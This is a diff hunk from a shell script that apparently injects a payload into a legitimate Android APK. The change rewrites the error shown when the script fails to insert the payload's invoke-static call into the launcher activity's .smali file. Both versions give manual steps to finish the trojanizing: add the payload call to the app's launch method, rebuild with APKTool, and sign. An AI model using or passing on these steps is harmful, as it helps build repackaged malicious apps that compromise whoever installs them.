@@ -146,7 +146,7 @@ if  grep -q "invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content
     echo
 else
     echo
-    echo -e "\033[31m Failed to insert the invoke command for the payload into the .smali file. \x1B[0m"
+    echo -e "\033[31m Failed to inject the invoke method into the onCreate method in /tmp/original/$launcherSmali . This may be because the developer used a non-standard function name. \x1B[0m"
     echo
     echo -e "\033[33m You can finish this manually by adding 'invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V' to the method that is called upon app launching in the file still present on disk: /tmp/original/$launcherSmali. Once you have did this, then all that you have left to do is build the package with APKTool and sign. "
     echo
